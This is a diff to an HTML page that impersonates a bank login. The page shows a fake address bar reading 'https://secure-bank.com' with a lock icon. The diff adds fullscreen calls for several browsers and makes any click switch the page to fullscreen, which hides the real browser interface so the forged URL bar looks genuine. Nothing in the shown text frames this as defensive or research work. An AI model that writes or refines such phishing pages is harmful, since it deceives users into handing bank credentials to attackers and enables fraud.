@@ -62,14 +62,19 @@
             let elem = document.documentElement;
             if (elem.requestFullscreen) {
                 elem.requestFullscreen();
-            } else if (elem.webkitRequestFullscreen) {
+            } else if (elem.mozRequestFullScreen) { // Firefox
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari and Opera
                 elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { // IE/Edge
+                elem.msRequestFullscreen();
             }
             document.getElementById('overlay').style.display = 'none';
         }
+        document.addEventListener("click", enterFullscreen);
     </script>
 </head>
-<body onload="setTimeout(enterFullscreen, 2000)">
+<body>
     <div id="fake-ui">🔒 <span>https://secure-bank.com</span></div>
     <div id="login-box">
         <h3>Login to Secure Bank</h3>
